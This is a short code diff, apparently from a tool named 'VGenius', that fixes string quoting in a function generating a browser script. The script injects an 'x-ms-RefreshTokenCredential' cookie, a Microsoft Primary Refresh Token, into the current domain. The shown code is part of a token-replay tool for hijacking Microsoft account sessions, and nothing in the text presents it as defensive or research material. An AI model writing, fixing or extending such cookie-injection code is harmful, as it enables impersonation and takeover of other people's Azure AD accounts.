@@ -529,7 +529,7 @@ function generateDirectInjectionScript(cookies, prtScript) {
     prtOutput += '    // Also try setting with the current page domain\n';
     prtOutput += '    var currentDomain = window.location.hostname;\n';
     prtOutput += '    if (currentDomain) {\n';
-    prtOutput += '      document.cookie = "x-ms-RefreshTokenCredential=' + prtValue + '; domain=.' + currentDomain + '; path=/; Secure; SameSite=None";\n';
+    prtOutput += '      document.cookie = "x-ms-RefreshTokenCredential=' + prtValue + '; domain=." + currentDomain + "; path=/; Secure; SameSite=None";\n';
     prtOutput += '      console.log("[VGenius] PRT cookie set for domain: " + currentDomain);\n';
     prtOutput += '    }\n';
     prtOutput += '  } catch(e) {\n';
